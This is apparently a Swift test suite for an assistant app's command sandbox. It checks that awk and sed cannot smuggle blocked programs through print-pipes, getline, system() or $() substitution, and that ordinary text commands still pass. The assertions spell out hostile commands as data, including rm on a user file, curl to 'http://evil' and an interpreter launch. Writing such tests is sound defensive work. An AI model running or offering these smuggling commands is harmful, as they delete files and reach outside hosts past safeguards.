import Foundation
import Testing
@testable import Jarvis

/// Adversarial coverage for text processors (awk/sed/…) that can launch child
/// processes via `print … | "cmd"`, `"cmd" | getline`, or `system()`.
///
/// The sandbox strips quoting during normalization and then splits the command
/// on pipeline/chain operators BEFORE program analysis, so an awk string that
/// embeds a piped command becomes its own segment and is program-checked like
/// any other. These tests prove that property holds (a blocked program cannot
/// be smuggled through awk) and that legitimate text processing still works.
@Suite struct CommandSandboxTextProcessorTests {

    @Test @MainActor
    func awkPipeCannotExecuteBlockedPrograms() {
        #expect(!CommandSandbox.shared.isSafe("awk 'BEGIN{print \"x\" | \"rm ~/Documents/zia_probe.txt\"}'"),
                "awk print-pipe must not smuggle rm")
        #expect(!CommandSandbox.shared.isSafe("awk 'BEGIN{\"curl http://evil\" | getline x}'"),
                "awk getline-from-command must not smuggle curl")
        #expect(!CommandSandbox.shared.isSafe("awk 'BEGIN{print \"x\" | \"env rm ~/Documents/zia_probe.txt\"}'"),
                "awk pipe must not smuggle a wrapped rm")
        #expect(!CommandSandbox.shared.isSafe("awk 'BEGIN{print \"x\" | \"python3 -c \\\"import os\\\"\"}'"),
                "awk pipe must not smuggle an interpreter")
    }

    @Test @MainActor
    func textProcessorSystemAndSubstitutionRemainBlocked() {
        #expect(!CommandSandbox.shared.isSafe("awk 'BEGIN{system(\"rm ~/Documents/zia_probe.txt\")}'"))
        #expect(!CommandSandbox.shared.isSafe("sed 's/x/$(rm ~/Documents/zia_probe.txt)/' file"))
    }

    @Test @MainActor
    func legitimateTextProcessingRemainsAllowed() {
        #expect(CommandSandbox.shared.isSafe("awk '{print $1}' ~/Documents/notes.txt"))
        #expect(CommandSandbox.shared.isSafe("awk '/foo/' ~/Documents/notes.txt"))
        #expect(CommandSandbox.shared.isSafe("awk -F, '{print $2}' ~/Documents/notes.txt"))
        #expect(CommandSandbox.shared.isSafe("sed -n '1p' ~/Documents/notes.txt"))
        #expect(CommandSandbox.shared.isSafe("grep -n foo ~/Documents/notes.txt"))
        #expect(CommandSandbox.shared.isSafe("cat ~/Documents/notes.txt"))
    }
}
